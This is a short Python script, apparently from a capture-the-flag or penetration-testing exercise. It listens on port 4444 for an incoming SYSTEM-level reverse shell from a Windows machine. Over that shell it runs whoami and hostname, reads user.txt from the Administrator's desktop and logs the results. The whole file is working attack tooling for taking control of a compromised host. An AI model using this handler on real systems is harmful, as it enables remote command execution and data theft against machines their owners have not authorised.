#!/usr/bin/env python3
"""Listen on 4444 for SYSTEM reverse shell; grab whoami + user.txt."""
import socket
import time

OUT = "/tmp/sysout.txt"
open(OUT, "w").write("starting\n")
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
s.settimeout(180)
open(OUT, "a").write("listening 4444\n")
open("/tmp/sysready", "w").write("1")
try:
    c, a = s.accept()
except Exception as e:
    open(OUT, "a").write(f"accept fail: {e}\n")
    raise SystemExit(1)
open(OUT, "a").write(f"CONN {a}\n")
c.settimeout(8)
try:
    banner = c.recv(4096)
    open(OUT, "a").write(banner.decode("utf-8", "replace"))
except Exception as e:
    open(OUT, "a").write(f"banner err {e}\n")

for cmd in [
    "whoami",
    "hostname",
    "type C:\\Users\\Administrator\\Desktop\\user.txt",
]:
    open(OUT, "a").write(f"\n>>> {cmd}\n")
    try:
        c.send((cmd + "\n").encode())
        time.sleep(1.5)
        data = b""
        while True:
            try:
                chunk = c.recv(8192)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
            if b"PS C:\\> " in data:
                break
        open(OUT, "a").write(data.decode("utf-8", "replace"))
    except Exception as e:
        open(OUT, "a").write(f"cmd err {e}\n")

open(OUT, "a").write("\nDONE\n")
c.close()
s.close()
